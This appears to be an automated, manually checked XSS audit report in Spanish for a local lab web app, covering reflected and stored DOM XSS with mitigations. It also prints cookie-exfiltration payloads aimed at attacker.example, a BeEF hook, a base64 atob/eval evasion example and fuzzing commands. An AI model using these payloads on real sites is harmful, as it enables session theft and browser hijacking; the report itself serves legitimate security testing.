# Informe de Auditoría XSS — web.dev.local:8082

Fecha: 2026-04-27T18:19:08Z
Objetivo: http://web.dev.local:8082
Auditor: laboratorio autorizado (Kali-like toolkit)

Resumen ejecutivo
-----------------
- Vectores encontrados: parámetro GET `search` (reflected/DOM) y parámetros GET `name` y `comment` (persistente via localStorage / DOM).
- Tipo(s) de XSS: DOM-based Reflected en `search`; Stored (persistente) DOM-based en comentarios (almacenados en localStorage y renderizados sin escape).
- Confirmación: inyección de JavaScript reflejado/ejecutado en contexto del DOM (document.write sin escape).

Hallazgos técnicos
------------------
1) Parámetro `search` (reflected / DOM XSS)
- Código vulnerable (extracto):
  document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
  --> `searchTerm` proviene de URLSearchParams(window.location.search).get('search') sin sanitizar.
- Prueba rápida (payload de confirmación):
  http://web.dev.local:8082/?search=<script>alert(1)</script>
  (Se ejecuta en el contexto de la página, confirmando XSS DOM reflejado.)

2) Comentarios (stored XSS vía localStorage / DOM)
- Código vulnerable: los parámetros `name` y `comment` se almacenan en localStorage y luego se renderizan usando document.write sin escape:
  comments.push({ name: name, comment: comment, ... });
  document.write('<div class="comment-author">' + c.name + '</div>');
  document.write('<div>' + c.comment + '</div>');
- Prueba de almacenamiento (GET request que simula publicar comentario):
  curl -s "http://web.dev.local:8082/?name=attacker&comment=<script>alert(1)</script>"
  Luego acceder a la página y observar ejecución de alert(1) desde la lista de comentarios (persistente en el navegador mediante localStorage).

Comandos y herramientas utilizadas (ejemplos reproducibles)
---------------------------------------------------------
- Recon / fuzzing (ejemplos con SecLists):
  ffuf -u "http://web.dev.local:8082/?search=FUZZ" -w /usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Strings-Brute.txt -mc 200 -t 50
  dalfox url "http://web.dev.local:8082/?search=<script>alert(1)</script>" -b /usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Strings-Brute.txt --follow-redirect
  xsstrike -u "http://web.dev.local:8082/?search=INJECT_HERE" --crawl 0

- Envío directo de payloads (simulación con curl / navegador):
  curl "http://web.dev.local:8082/?name=attacker&comment=<script>fetch('http://attacker.example:8000/?c='+encodeURIComponent(document.cookie))</script>"

Payloads finales y técnicas de explotación
-----------------------------------------
1) Payload de prueba (confirmación):
  <script>alert(1)</script>

2) Robo de sesión / exfiltración (ejemplo realista):
  <script>new Image().src='http://attacker.example:8000/steal?c='+encodeURIComponent(document.cookie)</script>
  o
  <script>fetch('http://attacker.example:8000/steal',{method:'POST',body:document.cookie})</script>

3) Hook BeEF (simulación):
  <script src="http://attacker.example:3000/hook.js"></script>

4) Evasión / ofuscación (ejemplo base64 para evitar simples filtros):
  <script>eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vYXRhY2FudGUuZXhhbXBsZToweDAwMDAvP2MnK2VuY29kZVVSSUNvbXBvbmVudCgkKHRvS2V5KSk='))</script>
  (Nota: poner payload real en base64 para ejecución al decodificar con atob->eval.)

Reproducción paso a paso
------------------------
1. Reflected (search): navegar a:
   http://web.dev.local:8082/?search=<script>alert(1)</script>
   - Resultado: el script se ejecuta inmediatamente al cargar la página (DOM-based XSS).

2. Stored (comments): enviar comentario malicioso mediante GET o formulario (simulado):
   http://web.dev.local:8082/?name=attacker&comment=<script>new Image().src='http://attacker.example:8000/?c='+encodeURIComponent(document.cookie)</script>
   - Resultado: el comentario queda guardado en localStorage y al recargar la página el payload se ejecuta para cualquier visitante del navegador que tenga esos comentarios.

Impacto
-------
- Robo de cookies / tokens de sesión, posible account takeover en sesiones no protegidas (cookies sin HttpOnly permiten exfiltración vía JS).
- Persistencia del payload (localStorage) permite persistir XSS en clientes hasta que se limpie localStorage o se eliminen los comentarios.
- Posibilidad de cargar BeEF o cualquier script remoto para control del navegador de la víctima (pivot local hacia red interna si existe).

Mitigaciones recomendadas
-------------------------
- No usar document.write con datos controlados por el usuario; escapar/encodear correctamente antes de insertar en DOM.
- Usar textContent / createTextNode para insertar texto en lugar de innerHTML/document.write.
- Aplicar Content Security Policy (CSP) restrictiva y marcar cookies sensibles con HttpOnly y Secure.
- Validación y saneamiento en el servidor (incluso si storage es client-side) y escape contextual en el cliente.

Evidencia / Notas finales
-------------------------
- Vectores confirmados localmente al inspeccionar el código fuente (document.write + URLSearchParams) y mediante ejemplos de payloads reproducibles.
- Se demuestra explotación efectiva mediante payloads de exfiltración y hook remoto (simulados, requieren servidor atacante disponible para recepción de datos).

Anexos: URLs de prueba
---------------------
- Reflected: http://web.dev.local:8082/?search=<script>alert(1)</script>
- Stored: http://web.dev.local:8082/?name=attacker&comment=<script>new Image().src='http://attacker.example:8000/?c='+encodeURIComponent(document.cookie)</script>


----
Informe generado por herramienta automatizada y verificado manualmente en contexto de laboratorio autorizado.
